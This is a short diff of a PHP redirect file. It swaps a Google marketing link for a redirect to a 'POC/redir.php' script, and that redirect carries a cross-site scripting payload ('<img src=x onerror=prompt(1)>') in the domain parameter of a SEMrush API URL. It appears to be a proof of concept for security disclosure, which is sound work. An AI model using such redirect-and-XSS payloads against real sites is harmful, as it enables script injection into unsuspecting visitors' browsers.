@@ -1,5 +1,5 @@
 
 <?php 
-header("Location: https://www.google.com/appserve/mkt/p/AFOm0uGu7_OIQYrQpUIwAf-uDIG8wI8FEqGs6QzwHWZwd2K-b6-3kECSnEppkUHdgW1a9ydGDpRp-Z3hj24RyKmNVdvnIxe62VDFqEeRW6nLJA")
+header("Location: http://secgeek.net/POC/redir.php?x=http://us.api.semrush.com/?action=report%26type=domain_rank%26domain=i<img src=x onerror=prompt(1)>.wordpress.com")
 
 ?>
